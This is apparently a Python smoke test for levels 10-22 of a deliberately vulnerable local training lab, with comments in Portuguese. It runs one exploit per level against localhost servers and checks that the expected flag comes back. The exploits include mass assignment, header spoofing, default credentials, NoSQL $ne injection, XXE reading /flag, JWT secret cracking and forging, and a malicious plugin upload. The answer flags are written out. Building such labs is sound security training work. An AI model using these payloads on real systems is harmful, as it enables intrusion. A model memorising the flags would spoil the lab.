"""Smoke test dos niveis 10-22: sobe cada alvo num thread e testa o exploit previsto.
Os niveis 20-22 exercitam tambem as ferramentas novas (jwt_crack/forge HS256,
http_request body cru e files multipart)."""
import base64, threading, time, importlib.util, os, sys
import http.server
import requests

sys.path.insert(0, ".")
from agent.tools import jwt_crack, jwt_forge, ToolContext  # noqa: E402

CTX = ToolContext(allowed_hosts={"127.0.0.1"})


def exp_jwt_hmac(b):
    # pega token guest, quebra o segredo, forja admin, acessa /admin
    home = requests.get(f"{b}/", timeout=5).text
    token = home.split("<pre>")[1].split("</pre>")[0].strip()
    secret = jwt_crack(CTX, token=token)["secret"]
    admin = jwt_forge(CTX, payload={"user": "admin", "role": "admin"}, alg="HS256", secret=secret)["token"]
    return requests.get(f"{b}/admin", headers={"Authorization": f"Bearer {admin}"}, timeout=5).text


def exp_xxe(b):
    xml = ('<?xml version="1.0"?>\n'
           '<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag"> ]>\n'
           '<comment>&xxe;</comment>')
    return requests.post(f"{b}/parse", data=xml.encode(),
                         headers={"Content-Type": "application/xml"}, timeout=5).text


def exp_upload(b):
    return requests.post(f"{b}/upload",
                         files={"plugin": ("x.py", "print(SECRET)")}, timeout=5).text


CASES = [
    ("targets/level10_massassign.py", 8009, "flag{m4ss_4ss1gnm3nt_r0l3_fr0m_cl13nt}",
     lambda b: requests.post(f"{b}/register", data={"username":"x","password":"y","role":"admin"}, timeout=5).text),
    ("targets/level11_verb.py", 8010, "flag{http_v3rb_t4mp3r1ng_byp4ss}",
     lambda b: requests.post(f"{b}/admin", timeout=5).text),
    ("targets/level12_xff.py", 8011, "flag{x_f0rw4rd3d_f0r_sp00f_1nt3rn4l}",
     lambda b: requests.get(f"{b}/admin", headers={"X-Forwarded-For":"10.0.0.5"}, timeout=5).text),
    ("targets/level13_disclosure.py", 8012, "flag{r0b0ts_d1s4ll0w_l34ks_th3_b4ckup}",
     lambda b: requests.get(f"{b}/backup/db_dump.bak", timeout=5).text),
    ("targets/level14_basicauth.py", 8013, "flag{b4s1c_4uth_d3f4ult_cr3ds_pwn3d}",
     lambda b: requests.get(f"{b}/admin", headers={"Authorization":"Basic "+base64.b64encode(b'admin:admin').decode()}, timeout=5).text),
    ("targets/level15_hosthdr.py", 8014, "flag{h0st_h34d3r_1nj3ct10n_vh0st}",
     lambda b: requests.get(f"{b}/admin", headers={"Host":"admin.corp.local"}, timeout=5).text),
    ("targets/level16_logic.py", 8015, "flag{bus1n3ss_l0g1c_n3g4t1v3_qty}",
     lambda b: requests.post(f"{b}/checkout", data={"item":"premium","qtd":"-1"}, timeout=5).text),
    ("targets/level17_error.py", 8016, "flag{v3rb0s3_3rr0r_d3bug_l34k}",
     lambda b: requests.get(f"{b}/api/saldo?id=abc", timeout=5).text),
    ("targets/level18_nosqli.py", 8017, "flag{n0sql_1nj3ct10n_n3_byp4ss}",
     lambda b: requests.post(f"{b}/login", data={"username":"admin","password[$ne]":"x"}, timeout=5).text),
    ("targets/level19_graphql.py", 8018, "flag{gr4phql_1ntr0sp3ct10n_h1dd3n_f13ld}",
     lambda b: requests.get(f"{b}/graphql?query={{secretFlag}}", timeout=5).text),
    ("targets/level20_jwthmac.py", 8019, "flag{jwt_w34k_hm4c_s3cr3t_cr4ck3d}", exp_jwt_hmac),
    ("targets/level21_xxe.py", 8020, "flag{xxe_3xt3rn4l_3nt1ty_f1l3_r34d}", exp_xxe),
    ("targets/level22_upload.py", 8021, "flag{f1l3_upl04d_t0_rc3_pwn3d}", exp_upload),
]


def load_handler(path):
    name = os.path.splitext(os.path.basename(path))[0]
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.Handler


ok = True
for path, port, flag, exploit in CASES:
    Handler = load_handler(path)
    srv = http.server.HTTPServer(("127.0.0.1", port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.2)
    base = f"http://127.0.0.1:{port}"
    try:
        body = exploit(base)
        passed = flag in body
    except Exception as exc:
        passed, body = False, f"ERRO: {exc}"
    print(("PASS" if passed else "FAIL"), os.path.basename(path))
    if not passed:
        print("   ->", body[:300]); ok = False
    srv.shutdown()

sys.exit(0 if ok else 1)
